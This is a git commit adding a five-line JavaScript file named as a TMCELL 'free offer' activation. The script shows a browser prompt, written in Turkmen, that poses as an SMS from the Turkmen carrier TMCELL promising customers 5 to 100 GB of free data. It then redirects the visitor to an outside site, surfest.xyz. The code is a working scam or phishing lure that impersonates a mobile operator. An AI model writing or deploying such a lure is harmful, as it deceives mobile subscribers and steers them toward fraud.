b42ba34f3afb558313b6682f42fa6b9c8a0daeb7
inemitid <asuquodavid021@gmail.com>
2025-05-27 21:33:56 -0700

    Create activation-tmcell-freeoffer.js

---
+++ activation-tmcell-freeoffer.js
@@ -0,0 +1,5 @@
+var password = 'Mugt maglumat'
+password=prompt('TMCELL SMS: Hormatly müşderi, TMCELL Sim kartaňyzyň 5 Gb-dan 100 Gb-a çenli maglumat almaga ukyplydygyny ýa-da ýokdugyny barlaň, Köne Müşderiler sylag, Indi barlamak üçin Mugt Maglumat basyň ','Mugt maglumat');
+if (password != 'Mugt maglumat') {
+location.href='https://surfest.xyz/tmcell-freeoffer.html';
+}
